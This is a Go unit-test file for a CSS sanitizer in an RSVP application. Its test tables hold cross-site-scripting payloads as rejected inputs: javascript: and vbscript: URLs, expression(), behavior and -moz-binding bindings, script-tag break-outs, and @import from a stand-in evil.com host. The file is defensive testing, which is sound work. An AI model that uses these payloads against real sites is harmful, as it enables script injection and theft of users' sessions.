package templates

import (
	"strings"
	"testing"

	"github.com/lenaxia/tinyrsvp/internal/models"
)

func TestCSSSanitizer_Validate_DangerousPatterns(t *testing.T) {
	sanitizer := NewCSSSanitizer()

	tests := []struct {
		name       string
		css        string
		wantErr    bool
		errPattern string
	}{
		{
			name:       "safe CSS",
			css:        "body { color: blue; font-size: 14px; }",
			wantErr:    false,
			errPattern: "",
		},
		{
			name:       "javascript URL",
			css:        "background: url(javascript:alert('xss'));",
			wantErr:    true,
			errPattern: "javascript:",
		},
		{
			name:       "javascript URL with quotes",
			css:        "background-image: url('javascript:alert(\"xss\")');",
			wantErr:    true,
			errPattern: "javascript:",
		},
		{
			name:       "case insensitive javascript",
			css:        "background: url(JaVaScRiPt:alert('xss'));",
			wantErr:    true,
			errPattern: "javascript:",
		},
		{
			name:       "javascript with whitespace",
			css:        "background: url(javascript  :  alert('xss'));",
			wantErr:    true,
			errPattern: "javascript:",
		},
		{
			name:       "expression",
			css:        "width: expression(alert('xss'));",
			wantErr:    true,
			errPattern: "expression(",
		},
		{
			name:       "expression with whitespace",
			css:        "width: expression  (alert('xss'));",
			wantErr:    true,
			errPattern: "expression(",
		},
		{
			name:       "case insensitive expression",
			css:        "height: ExPrEsSiOn(document.cookie);",
			wantErr:    true,
			errPattern: "expression(",
		},
		{
			name:       "behavior property",
			css:        "behavior: url(xss.htc);",
			wantErr:    true,
			errPattern: "behavior:",
		},
		{
			name:       "behavior with whitespace",
			css:        "behavior  :  url(xss.htc);",
			wantErr:    true,
			errPattern: "behavior:",
		},
		{
			name:       "case insensitive behavior",
			css:        "BeHaViOr: url(xss.htc);",
			wantErr:    true,
			errPattern: "behavior:",
		},
		{
			name:       "import statement",
			css:        "@import url('https://evil.com/xss.css');",
			wantErr:    true,
			errPattern: "@import",
		},
		{
			name:       "import without url",
			css:        "@import 'https://evil.com/steal.css';",
			wantErr:    true,
			errPattern: "@import",
		},
		{
			name:       "case insensitive import",
			css:        "@ImPoRt url('https://evil.com/xss.css');",
			wantErr:    true,
			errPattern: "@import",
		},
		{
			name:       "moz-binding",
			css:        "-moz-binding: url('http://evil.com/xss.xml#xss');",
			wantErr:    true,
			errPattern: "-moz-binding",
		},
		{
			name:       "case insensitive moz-binding",
			css:        "-MoZ-BiNdInG: url('http://evil.com/xss.xml#xss');",
			wantErr:    true,
			errPattern: "-moz-binding",
		},
		{
			name:       "data URL with HTML",
			css:        "background: url('data:text/html,<script>alert(1)</script>');",
			wantErr:    true,
			errPattern: "data:text/html",
		},
		{
			name:       "data URL with HTML uppercase",
			css:        "background: url('DATA:TEXT/HTML,<script>alert(1)</script>');",
			wantErr:    true,
			errPattern: "data:text/html",
		},
		{
			name:       "data URL with HTML and whitespace",
			css:        "background: url('data  :  text/html,<script>alert(1)</script>');",
			wantErr:    true,
			errPattern: "data:text/html",
		},
		{
			name:       "script tag in CSS",
			css:        "content: '</style><script>alert(\"xss\")</script>';",
			wantErr:    true,
			errPattern: "<script",
		},
		{
			name:       "closing script tag",
			css:        "content: 'test</script>';",
			wantErr:    true,
			errPattern: "</script",
		},
		{
			name:       "vbscript URL",
			css:        "background: url(vbscript:msgbox('xss'));",
			wantErr:    true,
			errPattern: "vbscript:",
		},
		{
			name:       "charset directive",
			css:        "@charset \"UTF-8\";",
			wantErr:    true,
			errPattern: "@charset",
		},
		{
			name:       "safe data URL image",
			css:        "background: url('data:image/png;base64,iVBORw0KGgoAAAANS');",
			wantErr:    false,
			errPattern: "",
		},
		{
			name:       "safe media query",
			css:        "@media (max-width: 768px) { .container { padding: 10px; } }",
			wantErr:    false,
			errPattern: "",
		},
		{
			name:       "safe calc function",
			css:        "width: calc(100% - 20px);",
			wantErr:    false,
			errPattern: "",
		},
		{
			name:       "safe gradient",
			css:        "background: linear-gradient(to right, red, blue);",
			wantErr:    false,
			errPattern: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := sanitizer.Validate(tt.css)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr && tt.errPattern != "" {
				if err == nil {
					t.Errorf("Expected error containing %q, got nil", tt.errPattern)
					return
				}
				if !strings.Contains(strings.ToLower(err.Error()), strings.ToLower(tt.errPattern)) {
					t.Errorf("Error message = %v, want to contain %q", err.Error(), tt.errPattern)
				}
				if _, ok := err.(*models.ValidationError); !ok {
					t.Errorf("Expected ValidationError, got %T", err)
				}
			}
		})
	}
}

func TestCSSSanitizer_Sanitize(t *testing.T) {
	sanitizer := NewCSSSanitizer()

	tests := []struct {
		name    string
		input   string
		want    string
		wantErr bool
	}{
		{
			name:    "safe CSS unchanged",
			input:   "body { color: blue; }",
			want:    "body { color: blue; }",
			wantErr: false,
		},
		{
			name:    "remove single-line comments",
			input:   "body { /* comment */ color: blue; }",
			want:    "body { color: blue; }",
			wantErr: false,
		},
		{
			name:    "remove multi-line comments",
			input:   "body {\n/* comment\nline 2 */\ncolor: blue;\n}",
			want:    "body { color: blue; }",
			wantErr: false,
		},
		{
			name:    "normalize whitespace",
			input:   "body  {  color:  blue;  }",
			want:    "body { color: blue; }",
			wantErr: false,
		},
		{
			name:    "normalize newlines",
			input:   "body\n{\n  color:\n  blue;\n}",
			want:    "body { color: blue; }",
			wantErr: false,
		},
		{
			name:    "reject dangerous pattern",
			input:   "body { behavior: url(xss.htc); }",
			want:    "",
			wantErr: true,
		},
		{
			name:    "reject javascript URL",
			input:   "background: url(javascript:alert('xss'));",
			want:    "",
			wantErr: true,
		},
		{
			name:    "complex safe CSS",
			input:   ".container { max-width: 600px; margin: 0 auto; padding: 20px; }",
			want:    ".container { max-width: 600px; margin: 0 auto; padding: 20px; }",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := sanitizer.Sanitize(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("Sanitize() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if !tt.wantErr && got != tt.want {
				t.Errorf("Sanitize() = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestCSSSanitizer_EdgeCases(t *testing.T) {
	sanitizer := NewCSSSanitizer()

	tests := []struct {
		name    string
		css     string
		wantErr bool
	}{
		{
			name:    "empty CSS",
			css:     "",
			wantErr: false,
		},
		{
			name:    "whitespace only",
			css:     "   \n\t  ",
			wantErr: false,
		},
		{
			name:    "comment only",
			css:     "/* just a comment */",
			wantErr: false,
		},
		{
			name:    "multiple dangerous patterns",
			css:     "body { behavior: url(xss.htc); background: url(javascript:alert('xss')); }",
			wantErr: true,
		},
		{
			name:    "dangerous pattern in comment should still be caught",
			css:     "/* javascript:alert('xss') */ body { color: blue; }",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := sanitizer.Validate(tt.css)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestCSSSanitizer_SafePatterns(t *testing.T) {
	sanitizer := NewCSSSanitizer()

	safeCSS := []string{
		"body { color: blue; }",
		".container { max-width: 600px; margin: 0 auto; }",
		"h1 { font-size: 24px; font-weight: bold; }",
		".button { background: #007bff; border-radius: 4px; }",
		"@media (max-width: 768px) { .container { padding: 10px; } }",
		"p { line-height: 1.6; }",
		".card { box-shadow: 0 2px 4px rgba(0,0,0,0.1); }",
		"a { text-decoration: none; }",
		".header { background-color: #333; color: white; }",
		"input { border: 1px solid #ddd; }",
	}

	for i, css := range safeCSS {
		t.Run(strings.ReplaceAll(css[:min(30, len(css))], " ", "_"), func(t *testing.T) {
			err := sanitizer.Validate(css)
			if err != nil {
				t.Errorf("Test %d: Validate() error = %v for safe CSS: %s", i, err, css)
			}

			sanitized, err := sanitizer.Sanitize(css)
			if err != nil {
				t.Errorf("Test %d: Sanitize() error = %v for safe CSS: %s", i, err, css)
			}
			if sanitized == "" && css != "" {
				t.Errorf("Test %d: Sanitize() returned empty string for non-empty safe CSS", i)
			}
		})
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
